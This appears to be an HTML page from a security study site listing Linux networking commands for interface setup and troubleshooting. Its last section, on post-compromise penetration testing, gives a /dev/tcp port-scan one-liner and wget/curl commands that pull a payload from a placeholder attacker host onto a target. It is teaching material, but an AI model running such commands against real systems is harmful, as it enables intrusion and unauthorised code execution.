@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en" style="background-color:#020202">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Networking Commands - Security Hub</title>
+    <!-- Phosphor Icons -->
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <link rel="stylesheet" href="../css/style.css">
+    <script>if (localStorage.getItem('theme') === 'light-mode') document.documentElement.classList.add('light-mode');</script>
+</head>
+
+<body>
+    <button class="mobile-toggle" id="mobile-toggle">
+        <i class="ph-list"></i>
+    </button>
+
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <h2><i class="ph-shield-warning"></i> SecNotes</h2>
+        </div>
+        <nav class="sidebar-nav">
+
+            <div class="nav-section">
+                <ul class="nav-list">
+                    <li class="nav-item">
+                        <a href="../index.html" class="">
+                            <i class="ph-house"></i> Home Dashboard
+                        </a>
+                    </li>
+                </ul>
+            </div>
+
+            <div class="nav-section">
+                <div class="section-title">linux</div>
+                <ul class="nav-list">
+                    <li class="nav-item">
+                        <a href="../linux/index.html" class="">
+                            <i class="ph-linux-logo"></i> Linux Overview
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../linux/file-permissions.html" class="">
+                            <i class="ph-key"></i> File Permissions
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../linux/processes.html" class="">
+                            <i class="ph-cpu"></i> Processes
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../linux/package-management.html" class="">
+                            <i class="ph-package"></i> Package Management
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../linux/networking-commands.html" class=" active">
+                            <i class="ph-wifi-high"></i> Networking Commands
+                        </a>
+                    </li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">bash</div>
+                <ul class="nav-list">
+                    <li class="nav-item">
+                        <a href="../bash/index.html" class="">
+                            <i class="ph-terminal-window"></i> Bash Overview
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../bash/basics.html" class="">
+                            <i class="ph-code"></i> Basics
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../bash/loops.html" class="">
+                            <i class="ph-arrows-clockwise"></i> Loops
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../bash/conditionals.html" class="">
+                            <i class="ph-git-branch"></i> Conditionals
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../bash/one-liners.html" class="">
+                            <i class="ph-magic-wand"></i> One Liners
+                        </a>
+                    </li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">networking</div>
+                <ul class="nav-list">
+                    <li class="nav-item">
+                        <a href="../networking/index.html" class="">
+                            <i class="ph-globe-hemisphere-west"></i> Networking Overview
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../networking/osi-model.html" class="">
+                            <i class="ph-stack"></i> OSI Model
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../networking/tcp-ip.html" class="">
+                            <i class="ph-share-network"></i> TCP/IP
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../networking/dns.html" class="">
+                            <i class="ph-book-bookmark"></i> DNS
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../networking/http-https.html" class="">
+                            <i class="ph-lock-key"></i> HTTP/HTTPS
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../networking/ports-protocols.html" class="">
+                            <i class="ph-plugs"></i> Ports & Protocols
+                        </a>
+                    </li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">web security</div>
+                <ul class="nav-list">
+                    <li class="nav-item">
+                        <a href="../web-security/index.html" class="">
+                            <i class="ph-shield-check"></i> Web Security
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../web-security/sqli.html" class="">
+                            <i class="ph-database"></i> SQL Injection
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../web-security/xss.html" class="">
+                            <i class="ph-browser"></i> XSS
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../web-security/authentication.html" class="">
+                            <i class="ph-password"></i> Authentication
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../web-security/session-management.html" class="">
+                            <i class="ph-cookie"></i> Session Management
+                        </a>
+                    </li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">privilege escalation</div>
+                <ul class="nav-list">
+                    <li class="nav-item">
+                        <a href="../privilege-escalation/index.html" class="">
+                            <i class="ph-trend-up"></i> Privilege Escalation
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../privilege-escalation/linux-privesc-basics.html" class="">
+                            <i class="ph-ladder"></i> Linux PrivEsc Basics
+                        </a>
+                    </li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">tools</div>
+                <ul class="nav-list">
+                    <li class="nav-item">
+                        <a href="../tools/index.html" class="">
+                            <i class="ph-toolbox"></i> Tools Overview
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../tools/nmap.html" class="">
+                            <i class="ph-radar"></i> Nmap
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../tools/wireshark.html" class="">
+                            <i class="ph-wave-sine"></i> Wireshark
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../tools/burpsuite.html" class="">
+                            <i class="ph-spider"></i> Burp Suite
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../tools/metasploit.html" class="">
+                            <i class="ph-skull"></i> Metasploit
+                        </a>
+                    </li>
+                </ul>
+            </div>
+
+
+            <div class="theme-toggle-wrapper">
+                <button id="theme-toggle" class="theme-toggle">
+                    <i class="ph-sun"></i> Light Mode
+                </button>
+            </div>
+        </nav>
+    </aside>
+
+    <div class="main-wrapper">
+        <main class="content">
+            <div class="content-header">
+                <div class="breadcrumb">
+                    <i class="ph-folder-open"></i> Linux <i class="ph-caret-right"></i> Networking Commands
+                </div>
+                <h1>Networking Commands</h1>
+                <p>Comprehensive knowledge base and reference guide.</p>
+            </div>
+
+            <div class="card">
+                <h2><i class="ph-wifi-high"></i> Linux Networking Operations</h2>
+                <p>Mastering network reconnaissance and configuration directly from the command line is foundational for
+                    any system administrator or security professional. Linux offers highly robust utilities to inspect
+                    interfaces, monitor traffic, and troubleshoot connections natively.</p>
+            </div>
+
+            <div class="card">
+                <h2><i class="ph-terminal-window"></i> Interface Configuration & Status</h2>
+                <div class="code-wrapper">
+                    <div class="code-header">
+                        <span class="code-lang">BASH</span>
+                        <button class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button>
+                    </div>
+                    <pre><code># Show IP addresses and network interfaces (Modern method)
+$ ip a  
+# Or:  ip addr show
+
+# Show IP addresses (Legacy method, deprecated but common)
+$ ifconfig
+
+# Show the routing table (How traffic finds its way out to the internet)
+$ ip route
+# Check specifically for the Default Gateway:
+$ ip route | grep default
+
+# Bring a network interface up or down
+$ sudo ip link set eth0 up
+$ sudo ip link set eth0 down</code></pre>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2><i class="ph-plugs"></i> Connection Troubleshooting</h2>
+                <div class="code-wrapper">
+                    <div class="code-header">
+                        <span class="code-lang">BASH</span>
+                        <button class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button>
+                    </div>
+                    <pre><code># Check if a host is alive (Uses ICMP Echo Requests)
+$ ping 8.8.8.8
+
+# See the exact path your packets take to reach a target
+$ traceroute google.com
+# Use 'mtr' for a real-time, dynamic traceroute (Highly recommended!)
+$ mtr google.com
+
+# Perform DNS lookups (Translate domain names to IPs)
+$ dig targetdomain.com
+$ nslookup targetdomain.com
+
+# Show active network connections, ports listening, and the PIDs associated
+# Note: 'netstat' is legacy, 'ss' is modern and faster.
+$ ss -tulnp
+$ netstat -tunlp</code></pre>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2><i class="ph-detective"></i> Security Tricks (Living off the land)</h2>
+                <p>During a penetration test where you do not have Nmap or Wireshark installed on the compromised
+                    machine, you can use built-in tools to extract network information:</p>
+                <ul class="styled-list">
+                    <li><strong>Finding local neighbors:</strong> You can view the ARP cache to see other machines on
+                        the same local subnet using <code>arp -a</code> or <code>ip neigh</code>.</li>
+                    <li><strong>Poor man's port scan:</strong> Using `/dev/tcp`: <code
+                            class="inline">timeout 1 bash -c 'cat &lt; /dev/null &gt; /dev/tcp/10.10.10.1/80' &amp;&amp; echo "Port Open"</code>
+                    </li>
+                    <li><strong>Downloading payloads:</strong> Use <code>wget http://attacker/payload.sh</code> or
+                        <code>curl -O http://attacker/payload.sh</code> to pull data onto a target over HTTP.</li>
+                </ul>
+            </div>
+
+        </main>
+    </div>
+
+    <script src="../js/script.js"></script>
+</body>
+
+</html>
